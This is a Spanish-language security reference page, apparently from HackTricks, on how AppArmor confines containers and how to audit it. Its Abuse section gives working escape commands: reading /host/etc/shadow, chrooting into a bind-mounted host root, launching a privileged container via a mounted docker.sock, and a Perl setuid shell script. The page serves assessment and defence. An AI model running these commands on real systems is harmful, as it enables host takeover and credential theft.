# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor es un sistema de **Control de Acceso Obligatorio** que aplica restricciones mediante perfiles por programa. A diferencia de las comprobaciones DAC tradicionales, que dependen en gran medida de la propiedad por usuario y grupo, AppArmor permite que el kernel haga cumplir una política asociada al propio proceso. En entornos de contenedores, esto importa porque una carga de trabajo puede tener suficientes privilegios tradicionales para intentar una acción y aun así ser denegada porque su perfil de AppArmor no permite la ruta, el montaje, el comportamiento de red o el uso de capabilities relevante.

El punto conceptual más importante es que AppArmor es **basado en rutas**. Razona sobre el acceso al sistema de archivos mediante reglas de ruta en lugar de mediante etiquetas como hace SELinux. Eso lo hace accesible y potente, pero también significa que los bind mounts y las disposiciones de rutas alternativas merecen atención cuidadosa. Si el mismo contenido del host llega a ser accesible bajo una ruta diferente, el efecto de la política puede no ser el que el operador esperaba inicialmente.

## Role In Container Isolation

Las revisiones de seguridad de contenedores a menudo se detienen en capabilities y seccomp, pero AppArmor sigue siendo importante después de esas comprobaciones. Imagina un contenedor que tiene más privilegios de los que debería, o una carga de trabajo que necesitaba una capability adicional por razones operativas. AppArmor todavía puede restringir el acceso a archivos, el comportamiento de montaje, la red y los patrones de ejecución de maneras que impidan la vía de abuso obvia. Por eso deshabilitar AppArmor "just to get the application working" puede transformar silenciosamente una configuración meramente arriesgada en una que sea activamente explotable.

## Lab

Para comprobar si AppArmor está activo en el host, utiliza:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver bajo qué contexto se está ejecutando el proceso actual del contenedor:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La diferencia es instructiva. En el caso normal, el proceso debería mostrar un contexto de AppArmor ligado al perfil elegido por el runtime. En el caso unconfined, esa capa adicional de restricción desaparece.

También puedes inspeccionar lo que Docker cree que aplicó:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso en tiempo de ejecución

Docker puede aplicar un perfil AppArmor predeterminado o personalizado cuando el host lo soporta. Podman también puede integrarse con AppArmor en sistemas basados en AppArmor, aunque en distribuciones con SELinux como primera opción el otro sistema MAC suele tomar protagonismo. Kubernetes puede exponer políticas de AppArmor a nivel de workload en nodos que realmente soportan AppArmor. LXC y los entornos de system-container relacionados de la familia Ubuntu también usan AppArmor de forma extensiva.

El punto práctico es que AppArmor no es una "característica de Docker". Es una funcionalidad del kernel del host que varios runtimes pueden elegir aplicar. Si el host no lo soporta o se indica al runtime que se ejecute sin confinamiento, la protección supuesta realmente no existe.

En hosts con AppArmor y soporte para Docker, el perfil por defecto más conocido es `docker-default`. Ese perfil se genera a partir de la plantilla AppArmor de Moby y es importante porque explica por qué algunos PoCs basados en capabilities aún fallan en un contenedor por defecto. En términos generales, `docker-default` permite el networking ordinario, deniega escrituras en gran parte de `/proc`, deniega el acceso a partes sensibles de `/sys`, bloquea operaciones de mount y restringe ptrace para que no sea una primitiva general de sondeo del host. Entender esa línea base ayuda a distinguir "el contenedor tiene `CAP_SYS_ADMIN`" de "el contenedor puede realmente usar esa capability contra las interfaces del kernel que me importan".

## Gestión de perfiles

Los perfiles de AppArmor normalmente se almacenan bajo `/etc/apparmor.d/`. Una convención de nombres común es reemplazar las barras del path del ejecutable por puntos. Por ejemplo, un perfil para `/usr/bin/man` suele almacenarse como `/etc/apparmor.d/usr.bin.man`. Este detalle importa tanto en defensa como en evaluación porque una vez que conoces el nombre del perfil activo, a menudo puedes localizar rápidamente el archivo correspondiente en el host.

Los comandos útiles para la gestión en el host incluyen:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La razón por la que estos comandos importan en una referencia de container-security es que explican cómo se construyen realmente los profiles, se cargan, se cambian a complain mode y se modifican tras cambios en la aplicación. Si un operador tiene la costumbre de mover los profiles a complain mode durante la resolución de problemas y olvida restaurar la enforcement, el contenedor puede parecer protegido en la documentación mientras se comporta de forma mucho más laxa en la realidad.

### Construcción y actualización de Profiles

`aa-genprof` puede observar el comportamiento de la aplicación y ayudar a generar un profile de forma interactiva:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` puede generar una plantilla de perfil que luego puede cargarse con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Cuando el binario cambia y la política necesita actualizarse, `aa-logprof` puede reproducir las denegaciones encontradas en los logs y ayudar al operador a decidir si permitirlas o denegarlas:
```bash
sudo aa-logprof
```
### Registros

Las denegaciones de AppArmor suelen ser visibles a través de `auditd`, syslog o herramientas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Esto es útil operativa y ofensivamente. Los defensores lo usan para refinar perfiles. Los atacantes lo usan para saber qué ruta u operación exacta está siendo denegada y si AppArmor es el control que bloquea una cadena de explotación.

### Identificando el archivo de perfil exacto

Cuando un runtime muestra un nombre de perfil de AppArmor específico para un container, a menudo es útil correlacionar ese nombre con el archivo de perfil en el disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Esto es especialmente útil durante la revisión en el host porque salva la brecha entre "el contenedor dice que se ejecuta bajo el perfil `lowpriv`" y "las reglas reales residen en este archivo específico que puede ser auditado o recargado".

## Misconfigurations

El error más obvio es `apparmor=unconfined`. Los administradores a menudo lo establecen mientras depuran una aplicación que falló porque el perfil bloqueó correctamente algo peligroso o inesperado. Si la bandera permanece en producción, la capa MAC completa se ha eliminado efectivamente.

Otro problema sutil es asumir que los bind mounts son inofensivos porque los permisos de archivos parecen normales. Puesto que AppArmor es path-based, exponer rutas del host bajo ubicaciones de montaje alternativas puede interactuar mal con las reglas de rutas. Un tercer error es olvidar que un nombre de perfil en un archivo de configuración significa muy poco si el kernel del host no está realmente aplicando AppArmor.

## Abuse

Cuando AppArmor no está presente, operaciones que antes estaban restringidas pueden funcionar de repente: leer rutas sensibles a través de bind mounts, acceder a partes de procfs o sysfs que deberían haber permanecido más difíciles de usar, realizar acciones relacionadas con mounts si capabilities/seccomp también las permiten, o usar rutas que un perfil normalmente negaría. AppArmor suele ser el mecanismo que explica por qué un intento de escape basado en capabilities "should work" en teoría pero aún así falla en la práctica. Quita AppArmor, y el mismo intento puede empezar a tener éxito.

Si sospechas que AppArmor es lo principal que impide una cadena de abuso basada en path-traversal, bind-mount, o mount-based, el primer paso suele ser comparar qué se vuelve accesible con y sin un perfil. Por ejemplo, si una ruta del host está montada dentro del contenedor, comienza comprobando si puedes recorrerla y leerla:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si el contenedor también tiene una capacidad peligrosa como `CAP_SYS_ADMIN`, una de las pruebas más prácticas es comprobar si AppArmor es el control que bloquea las operaciones de mount o el acceso a los sistemas de archivos sensibles del kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
En entornos donde un host path ya está disponible a través de un bind mount, perder AppArmor también puede convertir un problema de divulgación de información de solo lectura en acceso directo a archivos del host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
El objetivo de estos comandos no es que AppArmor por sí solo cree el breakout. Se trata de que, una vez que AppArmor se elimina, muchos filesystem y mount-based abuse paths se vuelven inmediatamente testables.

### Ejemplo completo: AppArmor deshabilitado + raíz del host montada

Si el container ya tiene el host root bind-mounted en `/host`, eliminar AppArmor puede convertir un blocked filesystem abuse path en un host escape completo:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una vez que el shell se ejecuta a través del sistema de archivos del host, la carga de trabajo ha escapado efectivamente del límite del contenedor:
```bash
id
hostname
cat /etc/shadow | head
```
### Ejemplo completo: AppArmor deshabilitado + Runtime Socket

Si la verdadera barrera era AppArmor alrededor del estado runtime, un socket montado puede ser suficiente para un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
La ruta exacta depende del punto de montaje, pero el resultado final es el mismo: AppArmor ya no está impidiendo el acceso a la API del runtime, y la API del runtime puede lanzar un contenedor que comprometa el host.

### Ejemplo completo: Path-Based Bind-Mount Bypass

Dado que AppArmor está basado en rutas, proteger `/proc/**` no protege automáticamente el mismo contenido de procfs del host cuando es accesible a través de una ruta diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
El impacto depende de qué exactamente esté montado y de si la ruta alternativa también elude otros controles, pero este patrón es una de las razones más claras por las que AppArmor debe evaluarse junto con el diseño de puntos de montaje en lugar de aisladamente.

### Ejemplo completo: Shebang Bypass

La política de AppArmor a veces apunta a la ruta de un intérprete de forma que no tiene en cuenta completamente la ejecución de scripts mediante el manejo de shebang. Un ejemplo histórico implicó usar un script cuya primera línea apunta a un intérprete confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Este tipo de ejemplo es importante como recordatorio de que la intención del perfil y la semántica de ejecución real pueden divergir. Al revisar AppArmor en entornos de contenedores, las cadenas de intérpretes y las rutas de ejecución alternativas merecen especial atención.

## Checks

El objetivo de estas comprobaciones es responder rápidamente tres preguntas: ¿está AppArmor habilitado en el host?, ¿está confinado el proceso actual?, y ¿el runtime aplicó realmente un perfil a este contenedor?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Lo interesante aquí:

- Si `/proc/self/attr/current` muestra `unconfined`, la carga de trabajo no se está beneficiando del confinamiento de AppArmor.
- Si `aa-status` muestra AppArmor deshabilitado o no cargado, cualquier nombre de perfil en la configuración del runtime es en su mayoría cosmético.
- Si `docker inspect` muestra `unconfined` o un perfil personalizado inesperado, eso suele ser la razón por la que una ruta de abuso basada en el sistema de archivos o en montajes funciona.

Si un contenedor ya tiene privilegios elevados por razones operativas, mantener AppArmor habilitado a menudo marca la diferencia entre una excepción controlada y una falla de seguridad mucho más amplia.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor es compatible a través de `--security-opt`, pero el valor por defecto exacto depende del host/runtime y es menos universal que el perfil documentado `docker-default` de Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predeterminado condicional | Si `appArmorProfile.type` no está especificado, el valor por defecto es `RuntimeDefault`, pero solo se aplica cuando AppArmor está habilitado en el nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un perfil débil, nodos sin soporte AppArmor |
| containerd / CRI-O under Kubernetes | Sigue el soporte del nodo/runtime | Los runtimes comunes soportados por Kubernetes admiten AppArmor, pero la aplicación real todavía depende del soporte del nodo y de la configuración de la carga de trabajo | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Para AppArmor, la variable más importante suele ser el **host**, no solo el runtime. Una configuración de perfil en un manifiesto no crea confinamiento en un nodo donde AppArmor no está habilitado.
